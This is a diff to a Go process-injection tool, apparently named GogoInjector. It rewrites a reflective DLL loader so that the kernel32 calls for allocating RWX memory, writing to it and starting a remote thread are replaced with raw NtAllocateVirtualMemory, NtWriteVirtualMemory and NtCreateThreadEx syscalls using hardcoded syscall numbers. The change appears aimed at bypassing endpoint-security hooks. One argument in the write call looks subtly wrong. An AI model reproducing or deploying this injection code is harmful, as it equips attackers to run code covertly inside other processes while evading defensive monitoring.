@@ -1,11 +1,13 @@
 package inject
 
 import (
+	"GogoInjector/utils"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"runtime"
 	"strings"
+	"syscall"
 	"unsafe"
 
 	"github.com/Binject/debug/pe"
@@ -326,29 +328,111 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 	fmt.Printf("dwReflectiveLoaderOffset : %X\n", dwReflectiveLoaderOffset)
 
 	// alloc memory (RWX) in the host process for the image...
-	VirtualAllocEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
-	lpRemoteLibraryBuffer, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(dwSize), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
-	if !strings.Contains(err.Error(), "successfully") {
-		fmt.Println("Error during VirtualAllocEx. Error : ", err)
+
+	///START New comment
+	// VirtualAllocEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
+	// lpRemoteLibraryBuffer, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(dwSize), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
+	// if !strings.Contains(err.Error(), "successfully") {
+	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
+	// }
+	///END New comment
+
+	///////////// START ntallocatevirtualmemory
+	var baseA, zerob, alloctype, protect uintptr
+
+	dwSize2 := uintptr(dwSize) // need to this because dwSize is uint32. dwSize2 := 0x1000 would have worked too
+	protect = syscall.PAGE_EXECUTE_READWRITE
+	alloctype = 0x3000 //MEM_COMMIT | MEM_RESERVE
+	sysid := uint16(0x18)
+
+	fmt.Printf("Base address of allocated memory: %x\n", baseA)
+
+	r1, err := utils.Syscall(
+		sysid,                             //ntallocatevirtualmemory
+		uintptr(hProcess),                 //remote process handle
+		uintptr(unsafe.Pointer(&baseA)),   //empty base address (give us something anywhere)
+		zerob,                             //0
+		uintptr(unsafe.Pointer(&dwSize2)), //pointer to size
+		alloctype,                         //commit | reserve
+		protect,                           //rwx
+	)
+	if r1 != 0 || err != nil {
+		panic(err)
 	}
+
+	fmt.Printf("+++++MSP Base address of allocated memory: %x\n", baseA)
+	lpRemoteLibraryBuffer := baseA
+	///////////// END ntallocatevirtualmemory
+
 	fmt.Printf("lpRemoteLibraryBuffer : %#x\n", lpRemoteLibraryBuffer)
+
 	// write the image into the host process...
-	WriteProcessMemory := windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
-	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), lpRemoteLibraryBuffer, lpBuffer, uintptr(dwSize))
-	if !strings.Contains(err.Error(), "successfully") {
-		fmt.Println("Error during VirtualAllocEx. Error : ", err)
+
+	///START New comment
+	// WriteProcessMemory := windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
+	// _, _, err = WriteProcessMemory.Call(uintptr(hProcess), lpRemoteLibraryBuffer, lpBuffer, uintptr(dwSize))
+	// if !strings.Contains(err.Error(), "successfully") {
+	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
+	// }
+	///END New comment
+
+	///////////// START NtWriteVirtualMemory
+
+	sysid = uint16(0x3a)
+	var BytesWritten uintptr
+	r1, err = utils.Syscall(
+		sysid,             //NtWriteVirtualMemory
+		uintptr(hProcess), //remote process handle
+		uintptr(unsafe.Pointer(lpRemoteLibraryBuffer)), //base address in the remote process
+		uintptr(unsafe.Pointer(lpBuffer)),              //pointer to our buffer where the dll is stored
+		uintptr(unsafe.Pointer(dwSize2)),               //size of buffer to write
+		uintptr(unsafe.Pointer(&BytesWritten)),         //optional but without it -> crash
+	)
+	if r1 != 0 || err != nil {
+		panic(err)
 	}
+
+	///////////// END NtWriteVirtualMemory
 
 	// add the offset to ReflectiveLoader() to the remote library address...
 	remoteReflectiveLoaderOffset := lpRemoteLibraryBuffer + uintptr(dwReflectiveLoaderOffset)
 
 	// Create a remote thread in the target process with the ReflectiveLoader function as the entry point
-	fmt.Printf("remoteReflectiveLoaderOffset : %#x\n", remoteReflectiveLoaderOffset)
-	CreateRemoteThreadEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThreadEx")
-	threadHandle, _, err := CreateRemoteThreadEx.Call(uintptr(hProcess), 0, 1024*1024, remoteReflectiveLoaderOffset, lpRemoteLibraryBuffer, 0, 0)
-	if !strings.Contains(err.Error(), "successfully") {
-		fmt.Println("Error during VirtualAllocEx. Error : ", err)
+
+	///START New comment
+	// fmt.Printf("remoteReflectiveLoaderOffset : %#x\n", remoteReflectiveLoaderOffset)
+	// CreateRemoteThreadEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThreadEx")
+	// threadHandle, _, err := CreateRemoteThreadEx.Call(uintptr(hProcess), 0, 1024*1024, remoteReflectiveLoaderOffset, lpRemoteLibraryBuffer, 0, 0) //lpRemoteLibraryBuffer == start of the injected dll in remote process -> passed as argument
+	// if !strings.Contains(err.Error(), "successfully") {
+	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
+	// }
+	///END New comment
+
+	///////////// START NtCreateThreadEx https://securityxploded.com/ntcreatethreadex.php
+	sysid = uint16(0xc2)
+	var threadHandle uintptr
+	//var hhosthread uintptr
+	r1, err = utils.Syscall(
+		sysid,                                  //NtCreateThreadEx
+		uintptr(unsafe.Pointer(&threadHandle)), //hthread
+		0x1FFFFF,                               //desiredaccess
+		0,                                      //objattributes
+		uintptr(hProcess),                      //processhandle
+		uintptr(remoteReflectiveLoaderOffset),  //lpstartaddress
+		uintptr(lpRemoteLibraryBuffer),         //lpparam
+		uintptr(0),                             //createsuspended
+		0,                                      //zerobits
+		0,                                      //sizeofstackcommit
+		0,                                      //sizeofstackreserve
+		0,                                      //lpbytesbuffer
+	)
+	syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)
+	if r1 != 0 || err != nil {
+		panic(err)
 	}
+
+	///////////// END NtCreateThreadEx
+
 	if threadHandle == 0 {
 		fmt.Println("Failed to create remote thread:", err)
 		return
